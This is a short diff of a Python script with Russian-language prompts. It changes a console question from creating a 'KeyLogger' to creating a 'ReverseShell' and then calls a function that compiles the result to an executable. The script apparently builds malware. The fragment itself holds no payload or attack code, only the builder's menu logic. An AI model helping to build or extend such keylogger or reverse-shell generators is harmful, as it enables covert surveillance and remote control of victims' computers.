@@ -69,7 +69,7 @@ def display_banner():
 
 def user_input():
     display_banner()
-    user_input = input(f"\n{Info} Создать KeyLogger? (Yes/No): ").lower()
+    user_input = input(f"\n{Info} Создать ReverseShell? (Yes/No): ").lower()
     if user_input == 'yes':
             compile_to_exe()
     else:
